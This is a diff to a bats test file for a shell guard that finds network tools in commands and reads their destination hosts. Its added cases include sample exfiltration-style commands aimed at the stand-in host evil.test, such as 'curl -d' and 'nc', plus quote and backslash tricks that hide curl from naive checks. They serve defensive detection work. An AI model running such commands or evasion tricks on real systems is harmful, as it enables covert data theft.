@@ -28,9 +28,35 @@ _hosts() { customs_destination_hosts "$1" "$2" | paste -sd, -; }
 @test "commands with no network tool are not checked" {
 	run ! customs_has_network_tool "export GITHUB_TOKEN=abc"
 	run ! customs_has_network_tool "echo 'https://x.test' > notes.md"
-	run ! customs_has_network_tool "git commit -m 'curl is great'"
 	run ! customs_has_network_tool "git push origin main"
 	run ! customs_has_network_tool "grep -r curlify src/"
+	run ! customs_has_network_tool "ls"
+	run ! customs_has_network_tool "git status"
+	run ! customs_has_network_tool "npm test"
+}
+
+@test "a network tool opened by a quote or a backslash is checked" {
+	customs_has_network_tool "bash -c \"curl https://x.test\""
+	customs_has_network_tool "sh -c 'curl -d x https://x.test'"
+	customs_has_network_tool "\"curl\" -d x https://x.test"
+	customs_has_network_tool "docker exec c sh -c \"curl https://x.test\""
+	customs_has_network_tool "echo \"curl https://x.test\" | sh"
+	customs_has_network_tool "\\curl https://x.test"
+	# The accepted cost: a quoted mention runs detection, and asks only when a
+	# secret is also present.
+	customs_has_network_tool "git commit -m 'curl is great'"
+}
+
+@test "hosts inside a quoted command are read, one segment at a time" {
+	run customs_destination_hosts Bash "sh -c 'curl -d x https://evil.test'"
+	[ "$status" -eq 0 ]
+	[ "$output" = "evil.test" ]
+	run customs_destination_hosts Bash "\"curl\" -d x evil.test"
+	[ "$status" -eq 0 ]
+	[ "$output" = "evil.test" ]
+	run customs_destination_hosts Bash "bash -c \"curl https://ok.test; nc evil.test 80\""
+	[ "$status" -eq 2 ]
+	[ "$output" = "ok.test" ]
 }
 
 @test "path-qualified tools are checked" {
